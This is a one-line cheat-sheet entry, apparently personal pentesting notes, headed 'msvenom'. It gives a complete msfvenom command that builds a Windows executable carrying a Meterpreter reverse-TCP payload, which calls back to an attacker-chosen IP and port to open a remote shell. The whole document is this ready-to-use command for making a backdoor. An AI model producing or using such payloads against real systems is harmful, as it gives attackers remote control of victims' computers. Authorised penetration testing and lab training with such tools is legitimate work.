# msvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe -o payload.exe
